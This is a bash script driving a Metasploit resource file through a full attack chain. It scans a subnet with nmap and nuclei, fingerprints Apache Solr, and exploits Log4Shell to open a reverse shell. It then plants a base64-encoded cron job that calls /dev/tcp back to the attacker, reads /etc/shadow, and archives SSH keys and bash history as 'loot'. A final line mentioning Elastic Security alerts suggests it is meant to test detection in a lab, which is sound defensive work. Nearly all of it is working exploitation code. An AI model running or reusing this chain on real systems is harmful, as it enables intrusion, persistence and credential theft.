#!/bin/bash
# host-scan.sh - Network reconnaissance, vulnerability scanning, and exploitation
#
# A generic attacker script that scans a subnet, discovers services,
# identifies vulnerabilities, and exploits what it finds. Follows a
# realistic attacker workflow mapped to MITRE ATT&CK.
#
# Prerequisites:
#   - nmap installed
#   - Metasploit Framework installed (msfconsole)
#   - nuclei installed (optional, enhances vuln confirmation)
#   - Network connectivity between attacker and targets
#
# Usage:
#   ./host-scan.sh -s <SUBNET> -a <ATTACKER_IP> [-p <LPORT>]
#   ./host-scan.sh -t <TARGET_IP> -a <ATTACKER_IP> [-p <LPORT>]
#
# Examples:
#   # Full recon + exploit against a subnet
#   ./host-scan.sh -s 10.0.1.0/24 -a 10.0.1.200
#
#   # Skip recon, exploit a known target directly
#   ./host-scan.sh -t 10.0.1.10 -a 10.0.1.200

set -euo pipefail

# Defaults
LPORT=4444
PERSISTENCE_PORT=4445
SUBNET=""
TARGET_IP=""
ATTACKER_IP=""
SKIP_RECON=false

# Ports to scan during recon
SCAN_PORTS="22,80,443,8080,8443,8983,9200,9300,3306,5432,6379,27017"

usage() {
    echo "Usage: $0 -s <SUBNET> -a <ATTACKER_IP> [-p <LPORT>]"
    echo "       $0 -t <TARGET_IP> -a <ATTACKER_IP> [-p <LPORT>]"
    echo ""
    echo "  -s    Subnet to scan (e.g., 10.0.1.0/24)"
    echo "  -t    Skip recon, exploit this target directly"
    echo "  -a    Attacker IP address (this machine)"
    echo "  -p    Listener port for reverse shell (default: 4444)"
    echo ""
    echo "Examples:"
    echo "  $0 -s 10.0.1.0/24 -a 10.0.1.200"
    echo "  $0 -t 10.0.1.10 -a 10.0.1.200"
    exit 1
}

while getopts "s:t:a:p:h" opt; do
    case $opt in
        s) SUBNET="$OPTARG" ;;
        t) TARGET_IP="$OPTARG"; SKIP_RECON=true ;;
        a) ATTACKER_IP="$OPTARG" ;;
        p) LPORT="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [[ -z "${ATTACKER_IP}" ]]; then
    echo "ERROR: -a (attacker IP) is required."
    echo ""
    usage
fi

if [[ -z "${SUBNET}" && -z "${TARGET_IP}" ]]; then
    echo "ERROR: Either -s (subnet) or -t (target) is required."
    echo ""
    usage
fi

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
MAGENTA='\033[0;35m'
NC='\033[0m'

log() { echo -e "${MAGENTA}[host-scan]${NC} $1"; }
phase() {
    echo ""
    echo -e "${MAGENTA}$(printf '=%.0s' {1..80})${NC}"
    echo -e "${MAGENTA}[host-scan]${NC} ${WHITE}PHASE $1: $2${NC}"
    echo -e "${MAGENTA}[host-scan]${NC} ${CYAN}MITRE ATT&CK: $3${NC}"
    echo -e "${MAGENTA}$(printf '=%.0s' {1..80})${NC}"
    echo ""
    echo -e "${MAGENTA}[host-scan]${NC} $4"
    echo ""
}

# Working directory for scan outputs
WORKDIR="/tmp/host-scan-$$"
mkdir -p "$WORKDIR"

# Clean up previous runs
cleanup() {
    pkill -9 msfconsole 2>/dev/null || true
    pkill -9 -f "nc.*${LPORT}" 2>/dev/null || true
    pkill -9 -f "nc.*${PERSISTENCE_PORT}" 2>/dev/null || true
    rm -f /tmp/host-scan.rc 2>/dev/null || true
    sleep 1
}

# --- Banner ---
echo ""
echo -e "${RED} _   _           _     ____                  ${NC}"
echo -e "${RED}| | | | ___  ___| |_  / ___|  ___ __ _ _ __  ${NC}"
echo -e "${RED}| |_| |/ _ \\/ __| __| \\___ \\ / __/ _\` | '_ \\ ${NC}"
echo -e "${RED}|  _  | (_) \\__ \\ |_   ___) | (_| (_| | | | |${NC}"
echo -e "${RED}|_| |_|\\___/|___/\\__| |____/ \\___\\__,_|_| |_|${NC}"
echo ""
echo -e "${WHITE}    Network Recon + Vulnerability Exploitation${NC}"
echo ""

log "Attacker:  ${ATTACKER_IP}"
log "Port:      ${LPORT}"
if [[ -n "$SUBNET" ]]; then
    log "Subnet:    ${SUBNET}"
fi
if [[ -n "$TARGET_IP" ]]; then
    log "Target:    ${TARGET_IP}"
fi
echo ""

# ============================================================================
# PHASE 1 — RECON: Network Discovery and Service Enumeration
# ============================================================================

# Track what we find
declare -a LIVE_HOSTS=()
declare -a EXPLOITABLE_HOSTS=()
EXPLOIT_TYPE=""
EXPLOIT_PORT=""

if [[ "$SKIP_RECON" == "false" ]]; then

    phase "1a" "NETWORK DISCOVERY" "T1046 - Network Service Discovery" \
        "Scanning ${SUBNET} for live hosts and open services."

    # Step 1: nmap service scan across common ports
    log "Running nmap service scan on ports ${SCAN_PORTS}..."
    NMAP_OUTPUT="${WORKDIR}/nmap-scan.gnmap"
    NMAP_FULL="${WORKDIR}/nmap-scan.txt"
    nmap -sV -p "${SCAN_PORTS}" --open "${SUBNET}" -oG "${NMAP_OUTPUT}" -oN "${NMAP_FULL}" 2>/dev/null

    # Parse nmap results — collect all hosts with any open port
    while IFS= read -r line; do
        host=$(echo "$line" | grep -oP '\d+\.\d+\.\d+\.\d+' | head -1)
        if [[ -n "$host" && "$host" != "$ATTACKER_IP" ]]; then
            # Avoid duplicates
            if [[ ! " ${LIVE_HOSTS[*]:-} " =~ " ${host} " ]]; then
                LIVE_HOSTS+=("$host")
            fi
        fi
    done < <(grep "/open/" "${NMAP_OUTPUT}" 2>/dev/null || true)

    if [[ ${#LIVE_HOSTS[@]} -eq 0 ]]; then
        log "${RED}No live hosts found with open ports. Exiting.${NC}"
        rm -rf "$WORKDIR"
        exit 1
    fi

    log "${GREEN}Found ${#LIVE_HOSTS[@]} live host(s):${NC}"
    for h in "${LIVE_HOSTS[@]}"; do
        # Show what ports are open on each host
        PORTS=$(grep "$h" "${NMAP_OUTPUT}" | grep -oP '\d+/open' | tr '\n' ' ')
        log "  ${h}: ${PORTS}"
    done
    echo ""

    # Step 2: Service fingerprinting — probe each discovered service
    phase "1b" "SERVICE FINGERPRINTING" "T1592.002 - Gather Victim Host Information: Software" \
        "Probing discovered services to identify software and versions."

    for host in "${LIVE_HOSTS[@]}"; do
        echo -e "${CYAN}=== ${host} ===${NC}"

        # Check for web services on common ports
        for port in 8983 8080 80 443 9200; do
            # See if this host has this port open
            if ! grep -q "${host}.*${port}/open" "${NMAP_OUTPUT}" 2>/dev/null; then
                continue
            fi

            PROTO="http"
            [[ "$port" == "443" || "$port" == "8443" ]] && PROTO="https"

            # Try to identify the service
            RESPONSE=$(curl -sk --connect-timeout 3 "${PROTO}://${host}:${port}/" 2>/dev/null || echo "")

            if [[ -z "$RESPONSE" ]]; then
                continue
            fi

            # Check for Apache Solr
            if echo "$RESPONSE" | grep -qi "solr" || curl -sk --connect-timeout 3 "${PROTO}://${host}:${port}/solr/" 2>/dev/null | grep -qi "solr"; then
                log "  Port ${port}: ${GREEN}Apache Solr detected${NC}"

                # Fingerprint via admin API
                SOLR_INFO=$(curl -sk --connect-timeout 5 "${PROTO}://${host}:${port}/solr/admin/info/system" 2>/dev/null || echo "")
                if [[ -n "$SOLR_INFO" ]]; then
                    SOLR_VER=$(echo "$SOLR_INFO" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(d['lucene']['solr-spec-version'])
except:
    print('unknown')
" 2>/dev/null)

                    JAVA_VER=$(echo "$SOLR_INFO" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(d['jvm']['version'])
except:
    print('unknown')
" 2>/dev/null)

                    log "    Solr version: ${SOLR_VER}"
                    log "    JVM version:  ${JAVA_VER}"

                    # Check for Log4Shell vulnerability (CVE-2021-44228)
                    # Solr 8.x < 8.11.1 ships with Log4j 2.14.1 (vulnerable)
                    # Exploitation requires JDK < 8u191 for unrestricted JNDI class loading
                    if [[ "$SOLR_VER" =~ ^8\. && "$SOLR_VER" < "8.11.1" ]]; then
                        JDK_UPDATE=$(echo "$JAVA_VER" | grep -oP '1\.8\.0_\K\d+' || echo "999")
                        if [[ "$JDK_UPDATE" -lt 191 ]]; then
                            log "    ${RED}VULNERABLE: Log4Shell (CVE-2021-44228)${NC}"
                            log "    ${RED}  Solr ${SOLR_VER} ships Log4j 2.14.1 + JDK 8u${JDK_UPDATE} allows JNDI class loading${NC}"
                            EXPLOITABLE_HOSTS+=("$host")
                            EXPLOIT_TYPE="log4shell"
                            EXPLOIT_PORT="$port"
                        else
                            log "    ${YELLOW}Solr ${SOLR_VER} has vulnerable Log4j, but JDK 8u${JDK_UPDATE} restricts JNDI${NC}"
                        fi
                    elif [[ "$SOLR_VER" != "unknown" ]]; then
                        log "    ${GREEN}Solr ${SOLR_VER} — Log4j patched${NC}"
                    fi
                fi
                continue
            fi

            # Check for Elasticsearch
            if echo "$RESPONSE" | grep -q "cluster_name\|tagline.*You Know"; then
                log "  Port ${port}: ${GREEN}Elasticsearch detected${NC}"
                ES_VER=$(echo "$RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('version',{}).get('number','unknown'))" 2>/dev/null || echo "unknown")
                log "    Version: ${ES_VER}"
                continue
            fi

            # Check for Tomcat
            if echo "$RESPONSE" | grep -qi "tomcat\|apache-coyote"; then
                log "  Port ${port}: ${GREEN}Apache Tomcat detected${NC}"
                continue
            fi

            # Generic web service
            SERVER=$(curl -skI --connect-timeout 3 "${PROTO}://${host}:${port}/" 2>/dev/null | grep -i "^server:" | head -1 | cut -d: -f2- | xargs)
            if [[ -n "$SERVER" ]]; then
                log "  Port ${port}: ${SERVER}"
            else
                log "  Port ${port}: Web service (unidentified)"
            fi
        done
        echo ""
    done

    # Step 3: Vulnerability scanning with nuclei (if available)
    if command -v nuclei &>/dev/null && [[ ${#EXPLOITABLE_HOSTS[@]} -gt 0 ]]; then
        phase "1c" "VULNERABILITY SCANNING" "T1595.002 - Active Scanning: Vulnerability Scanning" \
            "Running nuclei to confirm exploitability via out-of-band callbacks."

        TARGETS_FILE="${WORKDIR}/targets.txt"
        for host in "${EXPLOITABLE_HOSTS[@]}"; do
            echo "http://${host}:${EXPLOIT_PORT}" >> "$TARGETS_FILE"
        done

        NUCLEI_OUTPUT="${WORKDIR}/nuclei-results.txt"
        log "Running nuclei vulnerability scan..."
        nuclei -l "$TARGETS_FILE" -severity critical,high -o "$NUCLEI_OUTPUT" 2>/dev/null || true

        if [[ -s "$NUCLEI_OUTPUT" ]]; then
            log "${GREEN}nuclei confirmed vulnerabilities:${NC}"
            while IFS= read -r line; do
                log "  ${RED}${line}${NC}"
            done < "$NUCLEI_OUTPUT"
        else
            log "${YELLOW}nuclei did not return results (interactsh may be unavailable).${NC}"
            log "Proceeding based on version fingerprinting."
        fi
        echo ""
    elif command -v nuclei &>/dev/null && [[ ${#LIVE_HOSTS[@]} -gt 0 && ${#EXPLOITABLE_HOSTS[@]} -eq 0 ]]; then
        phase "1c" "VULNERABILITY SCANNING" "T1595.002 - Active Scanning: Vulnerability Scanning" \
            "Running nuclei broad scan against discovered hosts."

        TARGETS_FILE="${WORKDIR}/targets.txt"
        for host in "${LIVE_HOSTS[@]}"; do
            for port in 8983 8080 80 443 9200; do
                if grep -q "${host}.*${port}/open" "${NMAP_OUTPUT}" 2>/dev/null; then
                    PROTO="http"
                    [[ "$port" == "443" || "$port" == "8443" ]] && PROTO="https"
                    echo "${PROTO}://${host}:${port}" >> "$TARGETS_FILE"
                fi
            done
        done

        NUCLEI_OUTPUT="${WORKDIR}/nuclei-results.txt"
        log "Running nuclei broad vulnerability scan..."
        nuclei -l "$TARGETS_FILE" -severity critical,high -o "$NUCLEI_OUTPUT" 2>/dev/null || true

        if [[ -s "$NUCLEI_OUTPUT" ]]; then
            log "${GREEN}nuclei found vulnerabilities:${NC}"
            while IFS= read -r line; do
                log "  ${RED}${line}${NC}"
            done < "$NUCLEI_OUTPUT"
        else
            log "${YELLOW}No critical/high vulnerabilities confirmed by nuclei.${NC}"
        fi
        echo ""
    fi

    # Recon summary
    echo -e "${MAGENTA}$(printf '=%.0s' {1..80})${NC}"
    log "${WHITE}RECON SUMMARY${NC}"
    echo -e "${MAGENTA}$(printf '=%.0s' {1..80})${NC}"
    echo ""
    log "Hosts discovered:   ${#LIVE_HOSTS[@]}"
    log "Exploitable:        ${#EXPLOITABLE_HOSTS[@]}"
    if [[ -n "$EXPLOIT_TYPE" ]]; then
        log "Exploit available:  ${EXPLOIT_TYPE}"
    fi
    echo ""

    if [[ ${#EXPLOITABLE_HOSTS[@]} -eq 0 ]]; then
        log "${YELLOW}No exploitable vulnerabilities found. Exiting.${NC}"
        log "Scan results saved to ${WORKDIR}/"
        exit 0
    fi

    for h in "${EXPLOITABLE_HOSTS[@]}"; do
        log "  ${RED}${h} — ${EXPLOIT_TYPE}${NC}"
    done

    # Pick the first exploitable host
    TARGET_IP="${EXPLOITABLE_HOSTS[0]}"
    log "Selecting ${TARGET_IP} as primary exploit target."
    echo ""

else
    # Skip recon — user provided a target directly
    log "Skipping recon — targeting ${TARGET_IP} directly."
    EXPLOIT_TYPE="log4shell"
    EXPLOIT_PORT=8983

    # Quick connectivity check
    log "Checking connectivity to ${TARGET_IP}..."
    if curl -s --connect-timeout 5 "http://${TARGET_IP}:${EXPLOIT_PORT}/solr/" > /dev/null 2>&1; then
        log "${GREEN}Target is reachable on port ${EXPLOIT_PORT}${NC}"
    else
        log "${RED}WARNING: Cannot reach ${TARGET_IP}:${EXPLOIT_PORT}${NC}"
        log "Continuing anyway..."
    fi
    echo ""
fi

# ============================================================================
# PHASE 2+ — EXPLOITATION (dispatched by vulnerability type)
# ============================================================================

if [[ "$EXPLOIT_TYPE" == "log4shell" ]]; then

    # Build the cron job payload (base64 encoded to avoid escaping issues)
    CRON_LINE="* * * * * /bin/bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${PERSISTENCE_PORT} 0>&1'"
    CRON_B64=$(echo "$CRON_LINE" | base64 -w0 2>/dev/null || echo "$CRON_LINE" | base64 2>/dev/null)

    # Build the Metasploit resource script
    build_rc() {
        cat > /tmp/host-scan.rc << RCEOF
# ============================================================================
# CLEANUP
# ============================================================================
sessions -K
jobs -K

# ============================================================================
# PHASE 2: INITIAL ACCESS — Log4Shell (CVE-2021-44228)
# ============================================================================
use exploit/multi/http/log4shell_header_injection

set RHOSTS ${TARGET_IP}
set RPORT ${EXPLOIT_PORT}
set SRVHOST ${ATTACKER_IP}
set TARGETURI /solr/admin/info/system
set HTTP_HEADER User-Agent
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST ${ATTACKER_IP}
set LPORT ${LPORT}

exploit

sleep 5
sessions -l

<ruby>
# Helper: run a command on the session and display it
def run_cmd(cmd, session_id)
  print "\033[0;36m\$ \033[0m"
  cmd.each_char {|c| print "\033[0;32m#{c}\033[0m"; \$stdout.flush; sleep(0.01)}
  puts ""
  sleep(0.25)
  run_single("sessions -c '#{cmd}' #{session_id}")
  sleep(0.5)
end

# Check if we got a session
if framework.sessions.count == 0
  puts ""
  puts "\033[0;35m[host-scan]\033[0m \033[0;31mFAILED: No reverse shell established.\033[0m"
  puts "\033[0;35m[host-scan]\033[0m Possible causes:"
  puts "\033[0;35m[host-scan]\033[0m   - Target JDK >= 8u191 (JNDI class loading restricted)"
  puts "\033[0;35m[host-scan]\033[0m   - Target Log4j patched (>= 2.17.0)"
  puts "\033[0;35m[host-scan]\033[0m   - Firewall blocking ports 1389/8888 from target to attacker"
  puts "\033[0;35m[host-scan]\033[0m   - Check: iptables -L -n on attacker"
  puts ""
  run_single("exit")
end

\$session_id = framework.sessions.keys.first
puts ""
puts "\033[0;35m[host-scan]\033[0m \033[0;32mReverse shell established (session #{\$session_id})\033[0m"
puts "\033[0;35m[host-scan]\033[0m Exploited via Log4Shell JNDI injection in User-Agent header."
puts ""
</ruby>

# ============================================================================
# PHASE 3: DISCOVERY
# ============================================================================
<ruby>
puts ""
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[1;37mPHASE 3: DISCOVERY\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[0;36mMITRE ATT&CK: T1082 - System Information Discovery\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[host-scan]\033[0m Enumerating system info, running services, users, and network."
puts ""
sleep(3)

run_cmd("whoami", \$session_id)
run_cmd("id", \$session_id)
run_cmd("uname -a", \$session_id)
run_cmd("hostname", \$session_id)
run_cmd("cat /etc/passwd | grep -v nologin", \$session_id)
run_cmd("ps aux | grep -E 'java|solr|tomcat|elastic' | grep -v grep", \$session_id)
run_cmd("find /opt -name 'log4j-core-*.jar' 2>/dev/null | head -10", \$session_id)
run_cmd("java -version 2>&1 | head -1", \$session_id)
run_cmd("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null", \$session_id)

puts ""
puts "\033[0;35m[host-scan]\033[0m Discovery complete."
puts ""
</ruby>

# ============================================================================
# PHASE 4: PRIVILEGE ESCALATION
# ============================================================================
<ruby>
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[1;37mPHASE 4: PRIVILEGE ESCALATION\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[0;36mMITRE ATT&CK: T1548 - Abuse Elevation Control Mechanism\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[host-scan]\033[0m Checking sudo privileges for current user."
puts ""
sleep(3)

run_cmd("sudo -l", \$session_id)
run_cmd("sudo whoami", \$session_id)

puts ""
puts "\033[0;35m[host-scan]\033[0m Privilege escalation check complete."
puts ""
</ruby>

# ============================================================================
# PHASE 5: PERSISTENCE
# ============================================================================
<ruby>
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[1;37mPHASE 5: PERSISTENCE\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[0;36mMITRE ATT&CK: T1053.003 - Scheduled Task/Job: Cron\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[host-scan]\033[0m Installing cron job for persistent callback to ${ATTACKER_IP}:${PERSISTENCE_PORT}."
puts ""
sleep(3)

session = framework.sessions[\$session_id]
session.shell_command_token("echo ${CRON_B64} | base64 -d > /tmp/.cron")
session.shell_command_token("sudo crontab /tmp/.cron")
session.shell_command_token("rm -f /tmp/.cron")
sleep(0.5)

print "\033[0;36m\$ \033[0m"
"sudo crontab -l".each_char {|c| print "\033[0;32m#{c}\033[0m"; \$stdout.flush; sleep(0.01)}
puts ""
result = session.shell_command_token("sudo crontab -l")
puts result

puts ""
puts "\033[0;35m[host-scan]\033[0m Persistence established via cron."
puts ""
</ruby>

# ============================================================================
# PHASE 6: CREDENTIAL ACCESS
# ============================================================================
<ruby>
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[1;37mPHASE 6: CREDENTIAL ACCESS\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[0;36mMITRE ATT&CK: T1003.008 - OS Credential Dumping: /etc/shadow\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[host-scan]\033[0m Extracting password hashes from /etc/shadow."
puts ""
sleep(3)

run_cmd("sudo cat /etc/shadow", \$session_id)

puts ""
puts "\033[0;35m[host-scan]\033[0m Password hashes extracted."
puts ""
</ruby>

# ============================================================================
# PHASE 7: COLLECTION
# ============================================================================
<ruby>
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[1;37mPHASE 7: COLLECTION\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[0;36mMITRE ATT&CK: T1560.001 - Archive Collected Data\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[host-scan]\033[0m Archiving sensitive files for exfiltration."
puts ""
sleep(3)

tar_cmd = "sudo tar -czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /home/ubuntu/.ssh/authorized_keys /home/ubuntu/.bash_history 2>&1"
print "\033[0;36m\$ \033[0m"
tar_cmd.each_char {|c| print "\033[0;32m#{c}\033[0m"; \$stdout.flush; sleep(0.01)}
puts ""
sleep(0.25)
run_single("sessions -c '#{tar_cmd}' #{\$session_id}")
sleep(0.5)

run_cmd("ls -la /tmp/loot.tar.gz", \$session_id)

puts ""
puts "\033[0;35m[host-scan]\033[0m Sensitive files archived."
puts ""
</ruby>

# ============================================================================
# COMPLETE
# ============================================================================
<ruby>
puts "\033[0;35m#{'=' * 80}\033[0m"
puts "\033[0;35m[host-scan]\033[0m \033[1;37mATTACK CHAIN COMPLETE\033[0m"
puts "\033[0;35m#{'=' * 80}\033[0m"
puts ""
puts "\033[0;35m[host-scan]\033[0m Phases executed:"
puts "\033[0;35m[host-scan]\033[0m   1. Recon               - nmap, service fingerprinting, nuclei"
puts "\033[0;35m[host-scan]\033[0m   2. Initial Access       - Exploited discovered vulnerability"
puts "\033[0;35m[host-scan]\033[0m   3. Discovery            - Enumerated system, services, users"
puts "\033[0;35m[host-scan]\033[0m   4. Privilege Escalation - Checked sudo access"
puts "\033[0;35m[host-scan]\033[0m   5. Persistence          - Cron job for persistent callback"
puts "\033[0;35m[host-scan]\033[0m   6. Credential Access    - Extracted /etc/shadow hashes"
puts "\033[0;35m[host-scan]\033[0m   7. Collection           - Archived sensitive files"
puts ""
puts "\033[0;35m[host-scan]\033[0m All phases complete. Check Elastic Security for Defend alerts."
puts ""
</ruby>

sessions -K
exit
RCEOF
    }

    # --- Run the exploit ---
    log "Cleaning up previous sessions..."
    cleanup

    log "Building Metasploit resource script..."
    build_rc

    phase "2" "INITIAL ACCESS" "T1190 - Exploit Public-Facing Application" \
        "Exploiting Log4Shell (CVE-2021-44228) via JNDI injection in User-Agent header.
    Target: ${TARGET_IP}:${EXPLOIT_PORT}
    Metasploit starts rogue LDAP server (port 1389) and HTTP server (port 8888).
    Target's Log4j resolves the JNDI lookup, fetches malicious class, opens reverse shell."

    log "Launching Metasploit..."
    echo ""
    msfconsole -q -r /tmp/host-scan.rc

else
    log "${YELLOW}No supported exploit for type: ${EXPLOIT_TYPE}${NC}"
    log "Scan results saved to ${WORKDIR}/"
    exit 1
fi

echo ""
log "${GREEN}Attack complete.${NC}"

# Cleanup working directory
rm -rf "$WORKDIR"
